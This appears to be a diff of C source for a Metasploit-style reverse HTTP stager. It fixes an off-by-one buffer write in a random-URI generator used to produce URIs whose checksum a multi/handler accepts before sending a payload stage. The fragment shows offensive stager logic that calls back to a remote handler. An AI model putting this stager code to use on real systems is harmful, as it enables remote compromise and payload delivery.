@@ -50,18 +50,18 @@ void err_exit(char* message){
 }
 
 // ripped from http://stackoverflow.com/questions/440133/how-do-i-create-a-random-alpha-numeric-string-in-c
-void gen_random(char* s, const int len) { 
+void gen_random(const int len; char s[len], const int len) {
 	static const char alphanum[] =
 		"0123456789"
 		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 		"abcdefghijklmnopqrstuvwxyz";
 	int i = 0;
 
-	for (i = 0; i < len; ++i) {
+	for (i = 0; i < (len - 1); ++i) {
 		s[i] = alphanum[rand() % (sizeof(alphanum)-1)];
 	}
 
-	s[len] = 0;
+	s[len - 1] = 0;
 }
 
 int TextChecksum8(char* text)
@@ -186,7 +186,7 @@ unsigned char* rev_http(char* host, char* port, bool WithSSL){
 	srand(GetTickCount());
 	while (TRUE)				//Keep getting random values till we succeed, don't worry, computers are pretty fast and we're not asking for much.
 	{
-		gen_random(URI, 4);				//Generate a 4 char long random string ... it could be any length actually, but 4 sounds just fine.
+		gen_random(URI, sizeof(URI));				//Generate a 4 char long random string ... it could be any length actually, but 4 sounds just fine.
 		checksum = TextChecksum8(URI);	//Get the 8-bit checksum of the random value
 		if (checksum == 92)		//If the checksum == 92, it will be handled by the multi/handler correctly as a "INITM" and will send over the stage.
 		{
